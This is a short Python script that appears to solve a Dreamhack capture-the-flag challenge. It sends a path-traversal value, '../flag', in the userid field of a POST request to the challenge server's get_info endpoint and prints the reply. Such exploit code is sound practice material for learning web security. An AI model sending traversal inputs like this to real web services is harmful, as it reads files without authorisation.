import requests

url = "http://host3.dreamhack.games:10603/get_info"
data = {"userid": "../flag"} 
headers = {
}

response = requests.post(url, headers=headers, data=data)
print(response.text)
